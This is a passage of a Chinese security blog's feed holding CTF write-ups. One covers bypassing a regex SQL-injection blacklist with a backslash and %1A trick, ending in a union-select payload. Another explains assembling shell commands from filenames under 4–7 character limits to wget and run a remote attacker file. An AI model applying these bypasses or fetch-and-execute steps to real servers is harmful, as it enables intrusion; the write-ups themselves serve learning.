over&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;goto&lt;/span&gt; quit;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="web" scheme="https://myndtt.github.io/tags/web/"/>
    
      <category term="audit" scheme="https://myndtt.github.io/tags/audit/"/>
    
      <category term="sql" scheme="https://myndtt.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>从一道anti sql题讲起</title>
    <link href="https://myndtt.github.io/2017/11/09/%E4%B8%80%E9%81%93anti%20sql/"/>
    <id>https://myndtt.github.io/2017/11/09/一道anti sql/</id>
    <published>2017-11-09T12:00:07.000Z</published>
    <updated>2019-09-22T05:04:46.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>题目链接 <a href="http://antisqli.thinkout.rf.gd" target="_blank" rel="noopener">http://antisqli.thinkout.rf.gd</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   $con = mysqli_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>,<span class="string">"mytest"</span>)</span><br><span class="line">           <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">   $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">   $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line">   var_dump($pw);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">echo</span>  $id.<span class="string">','</span>.$pw.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"SELECT * FROM `user` WHERE `id`='&#123;$id&#125;' AND `pwssword`=md5('&#123;$pw&#125;');"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">       preg_match(</span><br><span class="line">           <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">           <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">           <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">           <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">           <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">           $id.<span class="string">','</span>.$pw</span><br><span class="line">       ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$result = mysqli_fetch_array(</span><br><span class="line">         mysqli_query(</span><br><span class="line">             $con, </span><br><span class="line">             <span class="string">"SELECT * FROM `user` WHERE `id`='&#123;$id&#125;' AND `pwssword`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">         )</span><br><span class="line">     );</span><br><span class="line">     mysqli_close($con);</span><br><span class="line">     <span class="keyword">echo</span> var_dump($result).<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">         <span class="keyword">if</span>($result[<span class="string">'id'</span>] === <span class="string">'1'</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"great"</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>很早之前就看见过这道题。最初想法是:</p><p>正则过滤了大部分东西,单引号,各种注释，但似乎没有过滤掉反斜杠,变量被单引号包含,想用反斜杠吃掉一个单引号,同时注释掉后面的不要的。</p><p><img src="http://myndtt.github.io/images/21.png" alt="1"></p><p>本地测试没有问题，但是这是建立在没有过滤注释的情况。然后我想不出其他方法了,然后问了龙师兄，龙师兄说他本地测试成功了，用的是“– ”注释，(注意是两个减号 最后是有一个空格的),FUZZ出一个可以成功绕过正则中的\s，但是没记录下来忘了…..并且在原题网站上是没有成功复现的，额……略显尴尬。最后就不了了之了。</p><h2 id="0x01-回头"><a href="#0x01-回头" class="headerlink" title="0x01.回头"></a>0x01.回头</h2><p>起初就是看书看累了，想休息休息看看代码之类的，突然想起上诉那道题目，就重新拿起来看看会不会有什么新发现。</p><h3 id="1-先说说反斜杠的问题"><a href="#1-先说说反斜杠的问题" class="headerlink" title="1.先说说反斜杠的问题"></a>1.先说说反斜杠的问题</h3><p>上面正则中明明有”<code>|\\|\xA0|</code>“，这不是匹配了反斜杠么，为什么还可以输入反斜杠? 错！第1个’&#39;转义 字符串的第2个’&#39;，结果为字符串为’&#39;,要想真正匹配反斜杠，你得需要4个:</p><p><img src="http://myndtt.github.io/images/30.png" alt="30"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'<span class="symbol">\\</span><span class="symbol">\\</span>' </span><br><span class="line">第1个'<span class="symbol">\'</span>转义字符串的第2个'<span class="symbol">\'</span>，字符串为'<span class="symbol">\'</span></span><br><span class="line">第3个'<span class="symbol">\'</span>转义第4个'<span class="symbol">\'</span>，相当于字符串'<span class="symbol">\'</span></span><br><span class="line">字符合起来为'<span class="symbol">\\</span>' 两个'<span class="symbol">\\</span>' 正则表达式看做'<span class="symbol">\'</span></span><br></pre></td></tr></table></figure><p>这样反斜杠就没问题了</p><p>ps ：补上一张图</p><p><img src="http://myndtt.github.io/images/31.png" alt="31"></p><h3 id="2-the-next"><a href="#2-the-next" class="headerlink" title="2.the next"></a>2.the next</h3><p>前段时间做出一道url中下划线的题，</p><p> <a href="http://myndtt.com/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/" target="_blank" rel="noopener">http://myndtt.com/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/</a></p><p><img src="http://myndtt.github.io/images/7.png" alt="7"></p><p>其中用的是无效字符，就想试试在这里有什么新的发现，果然:</p><p><img src="http://myndtt.github.io/images/22.png" alt="22"></p><p>“%1A”这类的url无效字符虽然无效但是是没有过滤掉的，我们用chrome来看更直接</p><p><img src="http://myndtt.github.io/images/23.png" alt="23"></p><p>恰好不知什么原因”–“可以在mysql某个版本(我自己测试的是Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)版本，其他版本没试过)中可以用来注释（上诉的无效字符都可以）</p><p><img src="http://myndtt.github.io/images/24.png" alt="24"></p><hr><p><img src="http://myndtt.github.io/images/25.png" alt="25"></p><p>这里在测试中遇到了这个:</p><p><img src="http://myndtt.github.io/images/26.png" alt="26"></p><p>是直接复制上诉成功的那句话，这里不成功应该跟命令行字符有关</p><p>还遇到了这个:</p><p><img src="http://myndtt.github.io/images/27.png" alt="27"></p><p>三条查询语句分别为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>* <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">'1'</span><span class="comment">--;             成功  查到的是id=1</span></span><br><span class="line"><span class="keyword">SELECT</span>* <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">'1'</span><span class="comment">--1;            成功  查到的是id=2</span></span><br><span class="line"><span class="keyword">SELECT</span>* <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">'1'</span><span class="comment">--';            不成功</span></span><br></pre></td></tr></table></figure><p>想了想，这里的第一条，第二条不是注释，而是跟mysql运算符先后有关，后来查了确实如此,id=’1’–1,应该是‘1’-(-1),即1减去负1，所以第二条查到的是id=2的数据,至于第一条到底是不是注释还是减去负0就不得而知了(正经脸)</p><p><img src="http://myndtt.github.io/images/28.png" alt="28"></p><p>ps: 想想“– ”是不是表示减去负数的空白符呢，而恰恰是这样就有着注释的含义。猜想而已，得去看看人家代码到底怎么写的，目前水平不够。</p><h2 id="0x02-end"><a href="#0x02-end" class="headerlink" title="0x02.end"></a>0x02.end</h2><p>最后还是没有在原来题目上复现成功，哈哈，又水了一篇。花了一点时间，爆破id,用上面的payload，然后将id从1遍历至31337还是没有结果。要不从负数开始?哈哈算求….  哦，对了，闲暇时搜了一下31337是什么意思</p><p><img src="http://myndtt.github.io/images/29.png" alt="29"></p><p>ps：</p><p>最后payload为:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\&amp;pw=<span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> 31337,31337,31337 <span class="title">from</span> <span class="title">antisqli</span> --%1<span class="title">A</span></span></span><br></pre></td></tr></table></figure><p><img src="http://myndtt.github.io/images/32.png" alt="32"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;题目链接 &lt;a href=&quot;http://antisqli.thinkout.rf.gd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://antisqli.thinkout.rf.gd&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;// It&#39;s &#39;Anti SQLi&#39; problem of &#39;Solve Me&#39;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $con = mysqli_connect(&lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;mytest&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;SQL server down&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $id = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $pw = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;pw&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   var_dump($pw);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;  $id.&lt;span class=&quot;string&quot;&gt;&#39;,&#39;&lt;/span&gt;.$pw.&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM `user` WHERE `id`=&#39;&amp;#123;$id&amp;#125;&#39; AND `pwssword`=md5(&#39;&amp;#123;$pw&amp;#125;&#39;);&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($id, $pw))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       preg_match(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;/\.|\`|&quot;|\&#39;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&#39;&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;=|&amp;lt;|&amp;gt;|\(|\)|@@|\|\||&amp;amp;&amp;amp;|#|\/\*.*\*\/|--[\s\xA0]|&#39;&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;0x[0-9a-f]+|0b[01]+|x\&#39;[0-9a-f]+\&#39;|b\&#39;[01]+\&#39;|&#39;&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;[\s\xA0\&#39;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&#39;&quot;]+|&#39;&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;union[\s\xA0]+select|[\s\xA0](where|having)|&#39;&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&#39;&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;string&quot;&gt;&#39;information_schema|procedure\s+analyse\s*/is&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           $id.&lt;span class=&quot;string&quot;&gt;&#39;,&#39;&lt;/span&gt;.$pw&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ) &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Hack detected&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://myndtt.github.io/tags/web/"/>
    
      <category term="audit" scheme="https://myndtt.github.io/tags/audit/"/>
    
      <category term="sqli" scheme="https://myndtt.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>the “*” in ubuntu</title>
    <link href="https://myndtt.github.io/2017/11/08/the-in-ubuntu/"/>
    <id>https://myndtt.github.io/2017/11/08/the-in-ubuntu/</id>
    <published>2017-11-08T05:22:54.000Z</published>
    <updated>2019-09-22T05:04:46.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>最近，大佬们在讨论hitcon-ctf中几道有意思的题，小菜我从中观看表哥“表演”，惊叹其神乎其神的“刀法”。在此之前我们先看一个例子:</p><p><img src="http://myndtt.github.io/images/16.png" alt="16"></p><p>上图中的“*”是不是很神奇！</p><a id="more"></a><h2 id="0x01-记录"><a href="#0x01-记录" class="headerlink" title="0x01.记录"></a>0x01.记录</h2><h3 id="7位"><a href="#7位" class="headerlink" title="7位"></a>7位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要说星号，得先从不久之前说起。之前，就有这么一道题。当时已经有很多大佬给出了解法：</p><p><a href="https://leet2.com/archives/limited-7-character-command-to-getshell.html" target="_blank" rel="noopener">https://leet2.com/archives/limited-7-character-command-to-getshell.html</a></p><p>我第一次看到这解法也是神乎其神，太厉害了。核心意思就是建立一些个文件，文件名字要特殊一些，这样当我们用“ls”或者“ls -t”命令时，控制台下面显示的将会是文件名字，当然指令不同，文件排序不同。</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>例如如果我们能够建立名字分别如“ls”，“-t”，”&gt;q”的三个文件并且当用ls命令确实也是这样依次显示，则用ls &gt;a命令时ls的输出就会到a中，看图：</p><p><img src="http://myndtt.github.io/images/17.png" alt="17"></p><p>指令意思大致依次为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.建立文件名字为1的文件     &gt;1</span><br><span class="line">2.建立文件名字为2的文件     &gt;2</span><br><span class="line">3.将ls命令的结果保存至文件a中（如果此前没有文件a,则创造文件）   ls &gt;a</span><br><span class="line">4.查看文件a                                                 cat a</span><br></pre></td></tr></table></figure><p>这样当我们创造出邪恶的文件名字，就会在文件比如a中存有特殊的指令（指令“sh a”就会执行a脚本，a文件中有指令当然要执行咯），那问题来了，我们要这些干什么呢？</p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>当然有用！当文件名依次是 “weget”,  “xx.xx/x” 的时候，执行ls &gt;q那么q文件中是不是就有了 weget xx.xx/x字符呢,然后再次执行sh q 就等于用weget指令从 xx.xx下载了x文件，此时文件x由自己控制，在该文件中可以是其他指令，再次sh x ，那么想要执行什么就可以执行什么了。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>指令由文件名字联合而来，所以要在命令”ls”或者其他如ls -t 下，文件依次连起来正好是你的指令。一般来说，你的域名合适的话，可以用ls,不合适的话只能用ls -t 来将文件按照时间排序。因为我们创造文件先后可控则ls -t也可以控，可是ls -t 这个命令很长，比如对下面的5位的来说就…</p><h3 id="5位"><a href="#5位" class="headerlink" title="5位"></a>5位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这就是该hitcon-ctf中的一道题，如果你以前做过上诉那道题，就知道大概方法了，只是长度的问题，并且要合理的利用好上诉的第一步从而产生类似“ls -t &gt;x”(x为文件名字)指令。表哥们已经解释的很详细了。</p><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p><a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/</a></p><h2 id="0x02-学习"><a href="#0x02-学习" class="headerlink" title="0x02.学习"></a>0x02.学习</h2><h3 id="4位"><a href="#4位" class="headerlink" title="4位"></a>4位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>当你还是用上诉的那个方法去做这题时，你会发现不可能，长度太有限，只有4位，创建文件都很难了。当没有很好的域名，那么必须要在第一步中创建出ls  -t &gt;a命令 可是字符要求越来越短，等于说难度越来越高。所以回到刚开始的“*”,星号在linux中是文件通配符，用来匹配文件:</p><p><img src="http://myndtt.github.io/images/18.png" alt="18"></p><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py</a></p><p>按照表哥的writeup得，你会发现居然是这么神奇：</p><p><img src="http://myndtt.github.io/images/20.png" alt="20"></p><p>神奇在恰好有”rev”这个反转指令，关键是指令其中有排序在字母r后面的字母v！</p><p>这里涉及到字符反转，因为确实要产生合理的文件顺序</p><p><img src="http://myndtt.github.io/images/19.png" alt="19"></p><p>如上图不反转，”dir“后面接上”ls “不会达到效果，echo可以但是却超过长度。（要创建echo 指令”&gt;echo“正好为5大于4），同是后面还需要&gt;q，排序不一样了，也不行。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03.总结"></a>0x03.总结</h2><p>做这类题很艺术，看似动尽心思，实则为平时积累和实力所致。感谢最后龙师兄的帮助，一语点醒。哈哈。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;最近，大佬们在讨论hitcon-ctf中几道有意思的题，小菜我从中观看表哥“表演”，惊叹其神乎其神的“刀法”。在此之前我们先看一个例子:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://myndtt.github.io/images/16.png&quot; alt=&quot;16&quot;&gt;&lt;/p&gt;
&lt;p&gt;上图中的“*”是不是很神奇！&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="学习" scheme="https://myndtt.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>sniperoj some web writeup</title>
    <link href="https://myndtt.github.io/2017/11/07/sniperoj-web-writeup/"/>
    <id>https://myndtt.github.io/2017/11/07/sniperoj-web-writeup/</id>
    <published>2017-11-07T07:54:41.000Z</published>
    <updated>2019-09-22T05:04:46.321Z</updated>
    
